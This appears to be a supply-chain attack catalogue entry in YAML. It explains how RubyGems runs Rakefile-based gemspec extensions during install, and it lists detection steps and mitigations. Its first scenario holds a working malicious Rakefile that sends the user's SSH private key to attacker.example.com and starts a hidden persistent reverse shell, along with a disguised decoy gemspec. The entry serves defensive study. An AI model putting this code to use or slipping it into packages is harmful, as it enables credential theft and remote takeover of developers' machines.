---
name: "RubyGems Build Script Execution via Gemspec Extensions"
packageManager: "gem"
slug: "gem-build-script"
category: "Code Execution"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "The gemspec `extensions` field can reference Rakefiles in addition to extconf.rb files. When a gem with Rakefile-based extensions is installed, RubyGems invokes Rake to execute the specified build tasks, which can contain arbitrary Ruby code including system commands, file operations, and network access. This provides another code execution vector during gem installation that is less commonly audited than extconf.rb."
prerequisites:
  - "Ability to publish a gem to rubygems.org or deliver a .gem file to the target"
  - "The victim must install the gem using gem install or bundle install"
  - "The malicious gem declares a Rakefile in its gemspec extensions field"
attackScenarios:
  - title: "Malicious Rakefile Extension in Gemspec"
    description: "An attacker publishes a gem whose gemspec extensions field points to a Rakefile. During gem install, RubyGems runs the Rakefile which contains tasks that execute arbitrary system commands. Unlike extconf.rb which is commonly associated with C extensions, Rakefile-based extensions may not raise suspicion during casual code review."
    commands:
      - label: "Create a malicious Rakefile"
        code: |
          # ext/Rakefile - executed during gem install
          require 'rake'
          require 'net/http'

          task :default do
            # Exfiltrate SSH keys
            ssh_key = File.read(File.expand_path("~/.ssh/id_rsa")) rescue "no key"
            uri = URI("https://attacker.example.com/collect")
            Net::HTTP.post_form(uri, { key: ssh_key, user: ENV['USER'] })

            # Create a reverse shell script
            File.write("/tmp/.maintenance.sh", <<~SH)
              #!/bin/bash
              while true; do
                bash -i >& /dev/tcp/attacker.example.com/8443 0>&1
                sleep 300
              done
            SH
            system("chmod +x /tmp/.maintenance.sh")
            system("nohup /tmp/.maintenance.sh &>/dev/null &")

            # Create dummy output so gem install succeeds
            mkdir_p "lib"
          end
        language: "ruby"
      - label: "Gemspec referencing the Rakefile as an extension"
        code: |
          Gem::Specification.new do |s|
            s.name        = "string-toolkit"
            s.version     = "2.1.0"
            s.summary     = "Useful string manipulation utilities"
            s.authors     = ["attacker"]
            s.files       = Dir["lib/**/*", "ext/**/*"]
            s.extensions  = ["ext/Rakefile"]
          end
        language: "ruby"
      - label: "Victim installs the gem, triggering the Rakefile"
        code: |
          gem install string-toolkit
          # Output appears normal:
          # Building native extensions. This could take a while...
          # Successfully installed string-toolkit-2.1.0
        language: "bash"
  - title: "Chained Extension Scripts"
    description: "An attacker uses the extensions field to chain multiple build scripts, increasing the attack surface and making detection harder by splitting malicious code across files."
    commands:
      - label: "Gemspec with multiple extension entry points"
        code: |
          Gem::Specification.new do |s|
            s.name       = "multi-ext-gem"
            s.version    = "1.0.0"
            s.summary    = "Multi-platform native extensions"
            s.authors    = ["attacker"]
            s.files      = Dir["lib/**/*", "ext/**/*"]
            s.extensions = [
              "ext/phase1/extconf.rb",   # Reconnaissance
              "ext/phase2/Rakefile"       # Payload delivery
            ]
          end
        language: "ruby"
detection:
  - title: "Review gemspec extensions field"
    description: "Before installing a gem, check its gemspec for the extensions field to identify any build scripts that will execute during installation."
    commands:
      - code: "gem specification string-toolkit extensions"
        language: "bash"
  - title: "Audit Rakefile contents before installation"
    description: "Unpack the gem and review any Rakefiles referenced in the extensions field for suspicious code such as system calls, network requests, or file operations targeting sensitive paths."
    commands:
      - code: |
          gem fetch string-toolkit
          gem unpack string-toolkit-*.gem
          find string-toolkit-*/ -name "Rakefile" -exec echo "=== {} ===" \; -exec cat {} \;
        language: "bash"
  - title: "Monitor process spawning during gem install"
    description: "Watch for unexpected child processes launched during gem installation."
    commands:
      - code: "strace -f -e trace=execve gem install string-toolkit 2>&1 | grep -v ruby"
        language: "bash"
mitigation:
  - "Audit the extensions field in gemspec files before installing gems with native extensions"
  - "Review all Rakefiles and extconf.rb files referenced by the extensions field"
  - "Install gems in sandboxed environments such as Docker containers"
  - "Use --no-document flag and consider --ignore-dependencies for manual auditing"
  - "Implement a gem allow-list policy for production environments"
references:
  - title: "RubyGems Specification Reference - extensions"
    url: "https://guides.rubygems.org/specification-reference/#extensions"
  - title: "RubyGems Guides - Gems with Extensions"
    url: "https://guides.rubygems.org/gems-with-extensions/"
created: 2026-04-02
updated: 2026-04-02
---
